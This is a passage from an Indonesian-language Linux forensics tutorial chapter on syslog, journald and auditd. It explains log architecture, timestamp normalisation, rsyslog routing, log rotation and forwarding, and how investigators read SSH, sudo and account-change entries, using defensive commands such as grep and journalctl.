## 📌 Daftar Isi — Bab 3

- [Bab 3 — Syslog, Journald & Log Forensics](#bab-3--syslog-journald--log-forensics)
  - [3.1 Arsitektur Logging Linux — Big Picture](#31-arsitektur-logging-linux--big-picture)
    - [3.1.1 Dua Jalur Logging: Syslog Klasik vs Journald](#311-dua-jalur-logging-syslog-klasik-vs-journald)
    - [3.1.2 Alur Data Log dari Kernel/Aplikasi sampai Disk](#312-alur-data-log-dari-kernelaplikasi-sampai-disk)
    - [3.1.3 Timezone & Timestamp Normalization](#313-timezone--timestamp-normalization)
  - [3.2 Syslog Klasik (rsyslog/syslog-ng)](#32-syslog-klasik-rsyslogsyslog-ng)
    - [3.2.1 Facility & Priority (Severity)](#321-facility--priority-severity)
    - [3.2.2 Format Pesan — RFC 3164 vs RFC 5424](#322-format-pesan--rfc-3164-vs-rfc-5424)
    - [3.2.3 Konfigurasi rsyslog (`/etc/rsyslog.conf`)](#323-konfigurasi-rsyslog-etcrsyslogconf)
    - [3.2.4 Peta File di `/var/log` — Distro Debian/Ubuntu vs RHEL/CentOS](#324-peta-file-di-varlog--distro-debianubuntu-vs-rhelcentos)
    - [3.2.5 Log Rotation (`logrotate`)](#325-log-rotation-logrotate)
    - [3.2.6 Remote / Centralized Logging (Log Forwarding)](#326-remote--centralized-logging-log-forwarding)
  - [3.3 Authentication & Authorization Log Forensics](#33-authentication--authorization-log-forensics)
    - [3.3.1 SSH Login — Sukses, Gagal, Brute Force](#331-ssh-login--sukses-gagal-brute-force)
    - [3.3.2 sudo & su — Privilege Escalation Trail](#332-sudo--su--privilege-escalation-trail)
    - [3.3.3 User/Group Management Events](#333-usergroup-management-events)
  - [3.4 systemd-journald](#34-systemd-journald)
    - [3.4.1 Overview & Lokasi Journal File](#341-overview--lokasi-journal-file)
    - [3.4.2 Persistent vs Volatile Journal](#342-persistent-vs-volatile-journal)
    - [3.4.3 Struktur Internal Journal File (`.journal`)](#343-struktur-internal-journal-file-journal)
    - [3.4.4 `journalctl` — Filtering Dasar](#344-journalctl--filtering-dasar)
    - [3.4.5 `journalctl` — Filtering Lanjutan untuk Investigasi](#345-journalctl--filtering-lanjutan-untuk-investigasi)
    - [3.4.6 Journal Metadata Field Quick Reference](#346-journal-metadata-field-quick-reference)
    - [3.4.7 Boot ID & Cross-Boot Correlation](#347-boot-id--cross-boot-correlation)
    - [3.4.8 Forward Secure Sealing (FSS) — Anti-Tamper Journal](#348-forward-secure-sealing-fss--anti-tamper-journal)
    - [3.4.9 Journal Rusak/Corrupt & Cara Recovery](#349-journal-rusakcorrupt--cara-recovery)
  - [3.5 auditd — Pelengkap Kernel-Level untuk Syslog/Journald](#35-auditd--pelengkap-kernel-level-untuk-syslogjournald)
    - [3.5.1 Posisi auditd — Complementary, Bukan Sumber Berdiri Sendiri](#351-posisi-auditd--complementary-bukan-sumber-berdiri-sendiri)
    - [3.5.2 Format `audit.log` & Tipe Event Kunci](#352-format-auditlog--tipe-event-kunci)
    - [3.5.3 `ausearch` & `aureport`](#353-ausearch--aureport)
    - [3.5.4 Audit Rules yang Relevan Forensik](#354-audit-rules-yang-relevan-forensik)
  - [3.6 Log Aplikasi & Layanan Lain](#36-log-aplikasi--layanan-lain)
    - [3.6.1 Cron & Task Scheduler](#361-cron--task-scheduler)
    - [3.6.2 Mail Log](#362-mail-log)
    - [3.6.3 Package Manager Log](#363-package-manager-log)
    - [3.6.4 Web Server Log (Nginx/Apache)](#364-web-server-log-nginxapache)
  - [3.7 Log Tampering & Anti-Forensics](#37-log-tampering--anti-forensics)
    - [3.7.1 Teknik Penghapusan/Manipulasi Log oleh Attacker](#371-teknik-penghapusanmanipulasi-log-oleh-attacker)
    - [3.7.2 Indikator Log Tampering](#372-indikator-log-tampering)
    - [3.7.3 Mitigasi & Hardening (Konteks Investigasi)](#373-mitigasi--hardening-konteks-investigasi)
  - [3.8 Timeline Correlation Lintas Sumber Log](#38-timeline-correlation-lintas-sumber-log)
  - [3.9 Log Reliability & Evidence Gap Table](#39-log-reliability--evidence-gap-table)
  - [3.10 Tabel Korelasi — Pertanyaan Investigasi ke Sumber Log](#310-tabel-korelasi--pertanyaan-investigasi-ke-sumber-log)
  - [3.11 Log Preservation / Acquisition](#311-log-preservation--acquisition)
  - [3.12 Ringkasan Command & Tools Cheat Sheet](#312-ringkasan-command--tools-cheat-sheet)
  - [3.13 Mini Case Study — Workflow Analisa End-to-End](#313-mini-case-study--workflow-analisa-end-to-end)

*(Bab 1: Struktur Linux & Filesystem Dasar — `bab1_linux.md`. Bab 2: Filesystem Forensics Ext4/XFS — `bab2_linux.md`.)*

---

## Bab 3 — Syslog, Journald & Log Forensics

> 💡 **Posisi Bab 3 di seri ini:** Bab 1 kasih tahu *di mana* lokasinya (`/var/log`, §1.2.5), Bab 2 bedah *bagaimana* filesystem menyimpan file itu di level inode/extent. Bab 3 masuk ke *apa isinya dan bagaimana membacanya* — dua sistem logging **wajib** yang hidup berdampingan di Linux modern (syslog klasik & journald binary, §3.2 & §3.4), dilengkapi `auditd` (§3.5) sebagai lapisan audit kernel opsional yang memperkuat temuan kalau kebetulan aktif. Bab ini adalah tulang punggung investigasi karena log adalah salah satu **sumber evidence non-destruktif** paling kaya — beda dari artefak filesystem (Bab 2) yang butuh recovery, log yang masih ada tinggal dibaca.

> 📖 **Kalau kamu familiar seri Windows:** Log Linux **konsepnya paralel** dengan Windows Event Log (`.evtx`, `EvtxECmd`) — bedanya besar di dua hal: (1) syslog klasik itu **plaintext**, jadi bisa langsung `grep`/`awk` tanpa parser khusus; (2) journald itu **binary terstruktur** dengan indexing, mirip filosofi `.evtx` tapi format & tooling beda total (`journalctl` vs `EvtxECmd`/Event Viewer). Linux **tidak punya** konsep Event ID terpusat seperti Windows (4624, 4688, dst) — sebagai gantinya, investigasi bergantung pada kombinasi *facility + priority + program name + free-text message*, kadang dibantu `auditd` yang punya `type=` event yang lebih terstruktur (mendekati semangat Event ID).

---

### 3.1 Arsitektur Logging Linux — Big Picture

#### 3.1.1 Dua Jalur Logging: Syslog Klasik vs Journald

**Pengertian & Fungsi:**
Linux modern (systemd-based, mayoritas distro sejak ~2015) sebenarnya menjalankan **dua sistem logging sekaligus** yang saling terhubung, bukan satu atau yang lain. Memahami relasi keduanya penting sebelum masuk ke detail masing-masing, karena satu event yang sama bisa "muncul dua kali" di dua tempat berbeda dengan format berbeda.

| Aspek | Syslog Klasik (rsyslog/syslog-ng) | systemd-journald |
|---|---|---|
| Format penyimpanan | Plaintext (`/var/log/*.log`) | Binary terindeks (`.journal`) |
| Standar pesan | RFC 3164 / RFC 5424 | Structured fields (bebas format, tapi ada field standar) |
| Bisa dibaca langsung | Ya — `cat`, `grep`, `tail` | Tidak — wajib `journalctl` atau parser khusus |
| Default aktif sejak | Dulu (Unix lama), masih dipakai luas | systemd ≥ 205 (mayoritas distro modern) |
| Rotasi | `logrotate` (eksternal) | Built-in (`SystemMaxUse`, dst) |
| Sumber data | Aplikasi yang eksplisit kirim via syslog API/socket | Kernel (`kmsg`), stdout/stderr semua unit systemd, syslog forward, native journal API |
| Nilai forensik utama | Kompatibilitas luas, gampang di-`grep`, ada di hampir semua server lama | Lebih kaya metadata per-entry (PID, UID, cgroup, boot ID), granularitas lebih tinggi |

> 📌 **Relasi keduanya di sistem modern:** Secara default, **journald menampung semuanya duluan** (termasuk pesan kernel & semua unit systemd), lalu **meneruskan sebagian ke rsyslog** (lewat socket `/run/systemd/journal/syslog`) supaya tetap terekam di `/var/log/*.log` versi plaintext tradisional. Artinya kalau `/var/log/auth.log` sudah dihapus attacker, ada kemungkinan besar **journal binary masih menyimpan datanya** — dan sebaliknya, kalau journal di-`--vacuum` habis tapi rotasi log lama plaintext belum kena `logrotate`, data lama masih ada di `/var/log/auth.log.1.gz` dst. Ini alasan kenapa investigasi log Linux **wajib cek kedua sumber**, tidak cukup salah satu.

#### 3.1.2 Alur Data Log dari Kernel/Aplikasi sampai Disk

```
Kernel (dmesg ring buffer /dev/kmsg) ──┐
                                        │
Aplikasi via syslog() API / socket ────┼──► systemd-journald ──┬──► /var/log/journal/  (persistent, §3.4.2)
                                        │         (kumpulkan     │    atau /run/log/journal/ (volatile)
stdout/stderr semua unit systemd ──────┘          semua entry)  │
                                                                  └──► forward ke rsyslog (imjournal/imuxsock)
                                                                            │
                                                                            ▼
                                                                  /etc/rsyslog.conf routing rules (§3.2.3)
                                                                            │
                                                                            ▼
                                                        /var/log/syslog atau /var/log/messages, auth.log,
                                                        kern.log, dst (plaintext, per-facility) ──► logrotate (§3.2.5)

Kernel Audit Subsystem (auditd) ── jalur TERPISAH, tidak lewat journald ──► /var/log/audit/audit.log (§3.5)
```

> ⚠️ **Poin kritis untuk investigasi:** `auditd` **tidak** bagian dari alur journald/rsyslog di atas — dia punya jalur sendiri langsung dari kernel audit subsystem. Kalau server target tidak menjalankan `auditd` (banyak distro default *tidak* mengaktifkannya), maka satu-satunya evidence eksekusi proses/syscall level ada di `/proc` (kalau masih live, Bab 1 §1.2.7) atau harus direkonstruksi tidak langsung dari journald/syslog aplikasi masing-masing.

#### 3.1.3 Timezone & Timestamp Normalization

**Pengertian & Fungsi:**
Sebelum satu baris log pun dianalisis, timezone harus dipastikan dulu — ini langkah yang paling sering dilewatkan tapi paling gampang menjungkirbalikkan kesimpulan timeline. Beda dari Windows yang cenderung konsisten menyimpan `.evtx` dalam UTC lalu menampilkan dalam local time di Event Viewer, Linux **tidak seragam**: tiap sumber log punya kebiasaan penyimpanan/tampilan timestamp yang berbeda-beda, dan semuanya bergantung pada setting timezone sistem yang bisa saja **berubah di tengah rentang waktu investigasi** (misal attacker sengaja mengubah timezone server untuk mengacaukan timeline).

| Sumber Log | Timestamp Disimpan Sebagai | Ditampilkan Default Sebagai |
|---|---|---|
| Syslog klasik RFC 3164 (`/var/log/*.log`) | Local time, **tanpa timezone offset eksplisit**, tanpa tahun (§3.2.2) | Apa adanya di file — mengikuti timezone sistem *saat baris itu ditulis* |
| Syslog RFC 5424 | ISO 8601 dengan offset eksplisit (`+07:00`) | Apa adanya di file |
| journald (`__REALTIME_TIMESTAMP`) | **Microsecond epoch UTC** (absolut, tidak ambigu secara internal) | `journalctl` merender ke **local time sistem saat kamu menjalankan query** — bisa beda dari timezone sistem korban kalau analisis dilakukan di workstation lain |
| `audit.log` | Epoch UNIX (`msg=audit(1755142523.482:...)`) — UTC, absolut | Angka epoch mentah — perlu dikonversi manual |
| Ext4/XFS inode timestamp (Bab 2 §2.1.2) | UTC internal di disk, filesystem tidak menyimpan timezone | Ditampilkan `stat`/`debugfs` mengikuti timezone shell yang menjalankan command |

```bash
# Cek timezone sistem yang sedang aktif — WAJIB dicek di awal investigasi
timedatectl status
cat /etc/timezone
readlink -f /etc/localtime

# Cek histori perubahan timezone (kalau tercatat di log/journald)
journalctl -u systemd-timedated --no-pager
grep -i "timezone" /var/log/syslog

# Paksa journalctl menampilkan UTC — HIGHLY RECOMMENDED untuk laporan forensik,
# supaya semua sumber log bisa dibandingkan di baseline yang sama
journalctl --utc

# Konversi epoch audit.log ke waktu manusiawi (UTC)
date -u -d @1755142523.482

# Cek status sinkronisasi NTP — kalau clock sistem drift/tidak sinkron,
# SEMUA timestamp log ikut tidak akurat relatif terhadap waktu nyata
timedatectl show -p NTPSynchronized -p SystemClockSynchronized
chronyc tracking 2>/dev/null || ntpq -p 2>/dev/null
```

> ⚠️ **Praktik wajib sebelum menulis timeline apapun:** Normalisasi **semua** timestamp dari semua sumber (syslog, journald, `audit.log`, inode) ke **satu basis waktu yang sama — idealnya UTC** — sebelum disusun jadi satu timeline gabungan (§3.8). Kalau ini dilewatkan, dua event yang sebenarnya terjadi bersamaan bisa terlihat berselisih berjam-jam hanya karena beda cara masing-masing tool menampilkan waktu, atau (skenario anti-forensics) attacker mengubah timezone sistem justru untuk memicu kebingungan ini.

> 📌 **Clock drift sebagai red flag tersendiri:** Kalau `chronyc tracking`/`ntpq -p` menunjukkan sistem tidak pernah sinkron NTP dengan benar, atau `SystemClockSynchronized=no`, catat ini secara eksplisit di laporan — akurasi absolut timeline jadi bergantung pada seberapa jauh clock drift-nya, bukan cuma soal timezone.

---

### 3.2 Syslog Klasik (rsyslog/syslog-ng)

#### 3.2.1 Facility & Priority (Severity)

**Pengertian & Fungsi:**
Setiap pesan syslog diklasifikasikan dengan dua atribut: **facility** (sumber/kategori subsistem) dan **priority/severity** (tingkat keparahan). Kombinasi keduanya menentukan routing pesan ke file log mana lewat rule di `rsyslog.conf` (§3.2.3).

| Facility | Kegunaan | Priority (0-7) | Arti |
|---|---|---|---|
| `kern` | Pesan kernel | 0 `emerg` | Sistem tidak bisa dipakai |
| `auth` / `authpriv` | Autentikasi, login, sudo | 1 `alert` | Butuh aksi segera |
| `daemon` | Daemon sistem generik | 2 `crit` | Kondisi kritis |
| `cron` | Cron/at scheduler | 3 `error` | Kondisi error |
| `mail` | Subsistem mail | 4 `warning` | Peringatan |
| `syslog` | Pesan internal syslog daemon | 5 `notice` | Normal tapi signifikan |
| `local0`-`local7` | Custom/aplikasi pihak ketiga | 6 `info` | Informasional |
| `user` | Pesan level user generik | 7 `debug` | Detail debug |

```bash
# Format facility.priority di config, contoh:
# auth,authpriv.*      → semua priority dari facility auth & authpriv
# *.emerg               → priority emerg dari SEMUA facility
# kern.warning;kern.!err → kern dengan warning ke atas, TAPI exclude err ke atas
```

> 💡 **Kenapa `authpriv` dipisah dari `auth`:** Banyak distro modern rute `authpriv` (isinya sudo, su, sshd, PAM) ke `/var/log/auth.log` (Debian/Ubuntu) atau `/var/log/secure` (RHEL/CentOS) dengan permission lebih ketat, terpisah dari `auth` generik — karena isinya lebih sensitif (credential-adjacent). Ini file **paling sering jadi target investigasi** access/lateral-movement.

#### 3.2.2 Format Pesan — RFC 3164 vs RFC 5424

**Pengertian & Fungsi:**
Dua standar format pesan syslog yang beredar di lapangan — penting dikenali karena mempengaruhi cara parsing timestamp dan field lain saat bikin script/regex sendiri.

```
RFC 3164 (BSD Syslog — legacy, masih paling umum di /var/log/*.log):
<PRI>Mmm dd hh:mm:ss hostname tag[PID]: message

Contoh:
<38>Aug 14 09:12:03 webserver01 sshd[2841]: Failed password for root from 203.0.113.5 port 51422 ssh2

RFC 5424 (format modern, dipakai syslog-ng & rsyslog opsional, timestamp ISO 8601):
<PRI>VERSION TIMESTAMP HOSTNAME APP-NAME PROCID MSGID STRUCTURED-DATA MSG

Contoh:
<38>1 2026-08-14T09:12:03.482112+07:00 webserver01 sshd 2841 - - Failed password for root from 203.0.113.5 port 51422 ssh2
```

> ⚠️ **Jebakan umum di CTF/investigasi:** Format RFC 3164 **tidak menyertakan tahun** di timestamp (`Mmm dd hh:mm:ss` saja) — tahun harus diasumsikan dari mtime file atau konteks lain. Kalau ada rotated log dari akhir tahun lalu tercampur dengan log tahun ini di direktori yang sama, salah asumsi tahun bisa bikin timeline berantakan. RFC 5424 tidak punya masalah ini karena timestamp-nya full ISO 8601 dengan tahun eksplisit.

#### 3.2.3 Konfigurasi rsyslog (`/etc/rsyslog.conf`)

**Pengertian & Fungsi:**
File ini (plus `/etc/rsyslog.d/*.conf`) menentukan **rule routing**: pesan dengan facility.priority tertentu masuk ke file log mana. Membaca config ini penting sebelum menyimpulkan "log X tidak ada evidence-nya" — bisa jadi memang rule-nya tidak pernah mengarahkan facility tersebut ke file yang sedang dicek, atau attacker mengubah rule ini untuk menyembunyikan jejak.

```bash
# Contoh isi rule khas /etc/rsyslog.conf (Debian/Ubuntu default)
auth,authpriv.*                 /var/log/auth.log
*.*;auth,authpriv.none          -/var/log/syslog
kern.*                          -/var/log/kern.log
mail.*                          -/var/log/mail.log
cron.*                          /var/log/cron.log
```

```bash
# Cek konfigurasi aktif & override di direktori .d
cat /etc/rsyslog.conf
ls -la /etc/rsyslog.d/
cat /etc/rsyslog.d/*.conf

# Cek status service (aktif/berhenti bisa jadi tanda tampering)
systemctl status rsyslog
```

> ⚠️ **Tanda tampering yang perlu dicek:** Rule yang di-comment-out tidak wajar, file config dengan mtime baru dibanding file sistem sekitarnya (Bab 2 §2.1.2 soal timestamp inode), atau service `rsyslog` yang di-stop sementara lalu di-start lagi (gap waktu di log yang tidak match aktivitas sistem lain) — semua ini pola khas attacker mematikan logging sebentar untuk beraksi lalu menyalakannya kembali.

#### 3.2.4 Peta File di `/var/log` — Distro Debian/Ubuntu vs RHEL/CentOS

**Pengertian & Fungsi:**
Nama file berbeda antar keluarga distro meski isinya secara konseptual sama — tabel ini jadi rujukan cepat supaya tidak salah cari file di distro yang belum familiar.

| Isi Log | Debian/Ubuntu | RHEL/CentOS/Fedora | Nilai Forensik |
|---|---|---|---|
| Log sistem umum | `syslog` | `messages` | Aktivitas daemon umum, timeline umum |
| Autentikasi & sudo/su | `auth.log` | `secure` | **Prioritas tinggi** — login, sudo, SSH |
| Kernel | `kern.log` | (masuk `messages`) | Hardware/driver, kernel panic, kadang modul mencurigakan |
| Cron | `cron.log` (kadang di `syslog`) | `cron` | Jadwal task, indikasi persistence via cron (lihat Bab 6) |
| Mail | `mail.log` | `maillog` | Command-and-control via mail, phishing internal |
| Boot | `boot.log` | `boot.log` | Urutan startup service |
| Package manager | `dpkg.log`, `apt/history.log` | `yum.log` / `dnf.log` (atau di rpm db) | Riwayat instalasi software (lihat juga Bab 1 §1.2.11) |
| X/GUI login | `Xorg.0.log`, `lightdm/` | `Xorg.0.log`, `gdm/` | Jarang relevan di server, penting di workstation |
| Firewall (kalau logging aktif) | `ufw.log` (biasanya digabung `kern.log`/`syslog`) | (via `iptables`/`firewalld` ke `messages`) | Koneksi diblok/diizinkan |
| Faillog/lastlog (bukan syslog, tapi terkait) | `/var/log/faillog`, `/var/log/lastlog` | sama | Percobaan login gagal, login terakhir per-user (binary format, butuh `lastlog`/`faillog` command) |

```bash
# Cek semua file log & subdirektori beserta ukurannya sekilas
ls -la /var/log/
du -sh /var/log/* | sort -rh | head -20
```

#### 3.2.5 Log Rotation (`logrotate`)

**Pengertian & Fungsi:**
`logrotate` mencegah `/var/log` membengkak tak terbatas dengan memutar (rename + compress) log secara periodik. Memahami skema penamaan hasil rotasi penting supaya tidak melewatkan evidence yang "sudah lama" tapi masih ada di disk, cuma namanya berubah.

```
Skema penamaan umum:
auth.log        ← log aktif saat ini
auth.log.1      ← rotasi 1 periode lalu (belum di-compress)
auth.log.2.gz   ← rotasi 2 periode lalu (sudah di-compress)
auth.log.3.gz
...
auth.log.N.gz   ← N ditentukan `rotate <N>` di config, lebih lama dari ini akan terhapus permanen
```

```bash
# Cek konfigurasi retention per-service
cat /etc/logrotate.conf
ls /etc/logrotate.d/
cat /etc/logrotate.d/rsyslog

# Baca file rotated yang sudah di-compress tanpa extract manual
zcat /var/log/auth.log.2.gz | less
zgrep "Failed password" /var/log/auth.log.*.gz

# Gabungkan semua generasi rotasi jadi satu timeline terurut
for f in /var/log/auth.log.*.gz; do zcat "$f"; done > /tmp/auth_all.log
cat /var/log/auth.log >> /tmp/auth_all.log
```

> 💡 **Retention window jadi batasan investigasi:** Kalau config `rotate 7` dengan rotasi harian, evidence syslog klasik cuma tersedia untuk **7 hari terakhir** — insiden yang lebih lama dari itu hanya bisa direkonstruksi lewat journald (kalau `SystemMaxUse`/`MaxRetentionSec` di journald diset lebih longgar, §3.4.2) atau sumber lain (file timestamp Bab 2, auditd §3.5 kalau retention-nya beda).

#### 3.2.6 Remote / Centralized Logging (Log Forwarding)

**Pengertian & Fungsi:**
Kalau sistem target dikonfigurasi mengirim log ke server terpusat (syslog server, SIEM, log aggregator), ini adalah **sumber paling bernilai** untuk investigasi — karena salinan di server tujuan **tidak terjangkau** oleh attacker yang cuma punya akses ke mesin korban. Mengecek konfigurasi forwarding harus jadi langkah awal triage, bukan langkah terakhir, karena menentukan apakah ada "cadangan" evidence di luar mesin yang sedang diperiksa.

```bash
# Cek apakah rsyslog dikonfigurasi forward ke server lain
grep -E "^\*\.\*.*@|^\S+\.\S+.*@" /etc/rsyslog.conf /etc/rsyslog.d/*.conf
# Notasi: @host:port  = UDP forwarding
#         @@host:port = TCP forwarding (lebih reliable, umum dipakai production)
#         @@@ / omfwd module dengan StreamDriver=gtls = TCP + TLS terenkripsi

# Contoh baris config forwarding khas:
# *.* @@logserver.internal:514
# *.* action(type="omfwd" target="10.0.0.5" port="6514" protocol="tcp"
#            StreamDriver="gtls" StreamDriverMode="1")

# Cek apakah journald juga forward ke syslog lokal (baseline default biasanya "yes")
grep -E "^ForwardToSyslog" /etc/systemd/journald.conf

# Cek forwarding journal BINARY (bukan cuma syslog) ke server terpusat —
# fitur systemd-journal-remote/systemd-journal-upload, kalau dipakai berarti
# salinan .journal FULL METADATA (bukan cuma pesan teks) ada di server lain
systemctl status systemd-journal-upload 2>/dev/null
cat /etc/systemd/journal-upload.conf 2>/dev/null
```

> 📌 **Kenapa forwarding journal binary lebih kuat dibanding forward syslog biasa:** `systemd-journal-upload` mengirim **seluruh entry beserta field metadata terstruktur** (`_PID`, `_EXE`, `_UID`, dst — lihat §3.4.6) ke `systemd-journal-remote` di server tujuan, bukan cuma baris teks seperti forwarding syslog klasik. Kalau ini aktif, server tujuan punya salinan journal yang **setara lengkap** dengan aslinya, memungkinkan filtering field yang sama persisnya seperti `journalctl` lokal.

> ⚠️ **Implikasi untuk investigasi:** Kalau ditemukan bukti log lokal dimanipulasi (§3.7) TAPI konfigurasi forwarding di atas menunjukkan log memang dikirim ke server lain, itu **wajib ditindaklanjuti** — minta akses ke log server terpusat sebagai sumber otoritatif, karena kemungkinan besar tidak ikut termanipulasi sama seperti mesin lokal yang sudah dikuasai attacker. Sebaliknya, kalau forwarding **tidak** dikonfigurasi sama sekali, satu-satunya sumber evidence adalah mesin lokal itu sendiri — jadikan prioritas lebih tinggi untuk akuisisi/preservation secepatnya (§3.11) sebelum data lebih lanjut hilang/dimanipulasi.

---

### 3.3 Authentication & Authorization Log Forensics

#### 3.3.1 SSH Login — Sukses, Gagal, Brute Force

**Pengertian & Fungsi:**
`auth.log`/`secure` adalah sumber utama investigasi akses jarak jauh — hampir selalu jadi titik awal analisis compromise via SSH.

| Pola Pesan (`sshd`) | Arti |
|---|---|
| `Accepted password for <user> from <ip> port <port> ssh2` | Login sukses via password |
| `Accepted publickey for <user> from <ip> port <port> ssh2: <algo> <fingerprint>` | Login sukses via SSH key — **catat fingerprint**, berguna korelasi `authorized_keys` (Bab 4) |
| `Failed password for <user> from <ip> port <port> ssh2` | Percobaan gagal (password salah) |
| `Failed password for invalid user <user> from <ip>` | Percobaan ke username yang **tidak ada** di sistem — indikasi enumerasi/brute force |
| `Invalid user <user> from <ip>` | Sama seperti di atas, muncul sebelum baris "Failed password" |
| `Disconnected from <ip> port <port> [preauth]` | Koneksi putus sebelum autentikasi selesai |
| `Received disconnect from <ip>: ... [preauth]` | Sama, variasi pesan |
| `Connection closed by authenticating user <user> <ip> port <port> [preauth]` | Klien memutus koneksi di tengah proses auth |

```bash
# Hitung percobaan gagal per-IP — deteksi brute force
grep "Failed password" /var/log/auth.log | awk '{print $(NF-3)}' | sort | uniq -c | sort -rn | head -20

# Semua login sukses (password ATAU publickey)
grep -E "Accepted (password|publickey)" /var/log/auth.log

# Cek pola waktu antar percobaan gagal — brute force otomatis biasanya interval sangat rapat/konstan
grep "Failed password" /var/log/auth.log | awk '{print $1,$2,$3}'
```

> 📌 **Cross-reference:** Fingerprint public key yang berhasil login harus dicocokkan dengan isi `~/.ssh/authorized_keys` milik user terkait (dibahas detail di Bab 4 — User, Auth & Shell Artifacts) untuk konfirmasi apakah key tersebut memang sah ditambahkan admin atau hasil injeksi attacker.

#### 3.3.2 sudo & su — Privilege Escalation Trail

**Pengertian & Fungsi:**
Log sudo/su adalah bukti langsung **command apa yang dijalankan dengan privilege lebih tinggi** — salah satu evidence paling bernilai karena sering langsung menunjukkan command persis yang dijalankan attacker.

```
Pola pesan sudo:
<user> : TTY=<tty> ; PWD=<dir> ; USER=root ; COMMAND=<full command>

Contoh:
Aug 14 09:15:44 webserver01 sudo: eatersun : TTY=pts/0 ; PWD=/home/eatersun ; USER=root ; COMMAND=/bin/bash

Pola pesan sudo GAGAL (password salah / bukan sudoer):
<user> : <N> incorrect password attempt(s) ; TTY=<tty> ; PWD=<dir> ; USER=root ; COMMAND=<command>
<user> : user NOT in sudoers ; TTY=<tty> ; PWD=<dir> ; USER=root ; COMMAND=<command>

Pola pesan su:
pam_unix(su:session): session opened for user root by <user>(uid=<uid>)
pam_unix(su:auth): authentication failure; logname=<log> uid=<uid> euid=0 ruid=<ruid> rhost= user=<user>
```

```bash
# Semua command yang dijalankan lewat sudo — evidence paling langsung
grep "sudo:" /var/log/auth.log | grep "COMMAND="

# Percobaan sudo gagal (salah password / bukan sudoer)
grep -E "incorrect password|NOT in sudoers" /var/log/auth.log

# Semua switch user (su) berhasil ke root
grep "session opened for user root by" /var/log/auth.log
```

> ⚠️ **Command sudo tanpa argumen mencurigakan:** Perhatikan pola `COMMAND=/bin/bash`, `COMMAND=/bin/sh`, atau `COMMAND=/usr/bin/python3 -c ...` — ini pola khas attacker membuka shell interaktif dengan privilege root lewat sudo (bukan menjalankan tool administratif spesifik), sering jadi indikator kuat post-exploitation setelah privilege escalation berhasil.

#### 3.3.3 User/Group Management Events

**Pengertian & Fungsi:**
Perubahan akun (user/group baru, password diubah) adalah pola persistence klasik — attacker sering membuat akun backdoor atau menambahkan user ke grup `sudo`/`wheel`.

| Pola Pesan | Sumber | Arti |
|---|---|---|
| `new user: name=<user>, UID=<uid>, GID=<gid>, home=<dir>, shell=<shell>` | `useradd` | User baru dibuat — **cek UID**, UID rendah tidak wajar untuk user baru bisa jadi red flag |
| `add 'eatersun' to group 'sudo'` | `usermod`/`gpasswd` | Privilege escalation via grup |
| `password changed for <user>` | `passwd` | Reset/ubah password — bisa jadi attacker "mengunci" akses admin lain |
| `new group: name=<group>, GID=<gid>` | `groupadd` | Grup baru dibuat |
| `delete user '<user>'` | `userdel` | User dihapus — attacker bisa hapus akun sendiri untuk hilangkan jejak |

```bash
grep -E "useradd|usermod|groupadd|userdel|new user|new group" /var/log/auth.log
```

> 🔗 Detail forensik `/etc/passwd`, `/etc/shadow`, dan struktur UID/GID akan dibahas mendalam di **Bab 4 — User, Auth & Shell Artifacts**; bagian ini fokus ke *jejak waktu perubahannya* lewat log, bukan struktur file-nya.

---

### 3.4 systemd-journald

#### 3.4.1 Overview & Lokasi Journal File

**Pengertian & Fungsi:**
`journald` adalah daemon logging systemd yang mengumpulkan semua pesan (kernel, semua unit systemd, syslog forward) ke dalam file binary terindeks. Ini bukan pengganti total syslog klasik, tapi lapisan yang **lebih dulu menangkap** semua data sebelum sebagian diteruskan ke rsyslog (§3.1.2).

```bash
# Lokasi file journal di disk
ls -la /var/log/journal/<machine-id>/     # persistent
ls -la /run/log/journal/<machine-id>/     # volatile (kalau tidak ada persistent dir)

# Cek machine-id sistem (subfolder journal dinamai sesuai ini)
cat /etc/machine-id
```

```
Contoh isi direktori journal:
/var/log/journal/a1b2c3.../
├── system.journal          ← log sistem aktif (kernel + service, non-user session)
├── system@0001....journal  ← file journal lama yang sudah "rotated" internal (archived)
├── user-1000.journal       ← log spesifik user session UID 1000
└── ...
```

#### 3.4.2 Persistent vs Volatile Journal

**Pengertian & Fungsi:**
Ini penentu paling kritis apakah journal **bertahan lintas reboot atau tidak** — harus dicek paling awal sebelum menyimpulkan journal "tidak ada data".

| Kondisi | Lokasi | Bertahan Reboot? |
|---|---|---|
| `/var/log/journal/` **ada** (direktori dibuat manual/default distro) | `/var/log/journal/<machine-id>/` | ✅ Ya — disk-backed |
| `/var/log/journal/` **tidak ada** | `/run/log/journal/<machine-id>/` | ❌ Tidak — `/run` adalah tmpfs (Bab 1 §1.2.6), hilang total saat reboot |

```bash
# Cek setting storage di config
grep -E "^Storage=" /etc/systemd/journald.conf
# auto  = pakai persistent kalau direktorinya ada, else volatile (default)
# persistent = paksa selalu disk-backed
# volatile = paksa selalu tmpfs, TIDAK PERNAH bertahan reboot
# none = journald tidak menyimpan apa-apa (jarang, biasanya cuma forward)

# Konfirmasi aktual sedang pakai storage apa
journalctl --disk-usage
```

> ⚠️ **Implikasi langsung untuk urutan kerja investigasi:** Sama seperti prinsip di Bab 1 §1.2.12 (volatile vs persistent) — kalau `Storage=volatile` atau direktori `/var/log/journal/` memang tidak pernah dibuat di sistem target, **seluruh riwayat journal sebelum reboot terakhir hilang permanen**. Ini harus dicek di awal triage, karena menentukan apakah journald bisa diandalkan untuk timeline jangka panjang atau cuma untuk sesi berjalan saat ini.

#### 3.4.3 Struktur Internal Journal File (`.journal`)

**Pengertian & Fungsi:**
Tidak perlu dihafal byte-level (beda dari kedalaman Bab 2 untuk Ext4), tapi paham konsep dasarnya membantu menjelaskan kenapa journal butuh tool khusus dan kenapa dia relatif tahan terhadap tampering sederhana.

| Komponen | Fungsi |
|---|---|
| **Header** | Metadata file — machine ID, boot ID, sequence number, waktu pembuatan |
| **Object arrays & hash tables** | Struktur indexing internal — inilah kenapa query `journalctl` dengan filter (waktu, unit, field) bisa cepat tanpa scan linear seperti grep di file teks |
| **Data objects** | Isi field individual (`MESSAGE=`, `_PID=`, `_COMM=`, dst) — disimpan terdeduplikasi/di-hash, satu data object bisa dirujuk banyak entry |
| **Entry objects** | Satu baris log = kumpulan pointer ke data object terkait, plus timestamp |
| **FSS sealing tag (opsional)** | Lihat §3.4.8 — tanda tangan kriptografis periodik untuk deteksi tampering |

```bash
# Cek header & integritas dasar file journal tertentu
journalctl --file=/var/log/journal/<machine-id>/system.journal --verify

# Info umum: rentang waktu yang tercakup, ukuran, jumlah boot tercatat
journalctl --list-boots
```

#### 3.4.4 `journalctl` — Filtering Dasar
